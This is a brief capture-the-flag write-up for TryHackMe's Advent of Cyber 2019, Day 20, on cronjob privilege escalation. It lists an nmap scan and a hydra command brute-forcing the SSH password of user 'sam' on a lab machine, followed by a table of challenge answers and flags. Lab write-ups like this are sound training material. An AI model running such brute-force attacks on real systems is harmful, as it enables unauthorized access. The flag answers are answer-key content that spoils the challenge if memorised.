# Advent of Cyber 01 - 2019
# Day 20
# Cronjob Privilege Escalation

> Machine IP : `10.10.13.251`
> nmap scanning : 
```
nmap  10.10.13.251 -oN nmap.txt
```

> Bruteforcing sam's SSH Password using hydra :
```
hydra -l sam -P /usr/share/wordlists/rockyou.txt ssh://10.10.13.251:4567 -t 4

```


| Que$t1on$ | An$wer$ |
|-----------|---------|
| What port is SSH running on? | 4567 |
| Crack sam's password and read flag1.txt |
| Excalate your privleges by taking advantage of a cronjob running every minute. What is flag2.txt | THM{dec4389bc09669650f3479334532aeab} | THM{b27d33705f97ba2e1f444ec2da5f5f61} |
